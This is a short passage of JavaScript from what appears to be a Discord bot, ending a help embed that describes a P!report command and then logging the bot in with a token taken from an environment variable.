            .addField(`📞 | Contact`,`[P!report (Message)](https://discord.gg/2kfPk9P) | Reporting a player that either broke rules, insulted, abused, annoyed.`)
            .setColor(0xff4c4c);
            message.channel.send(Help)
    }
});
client.login(process.env.BOT_TOKEN);
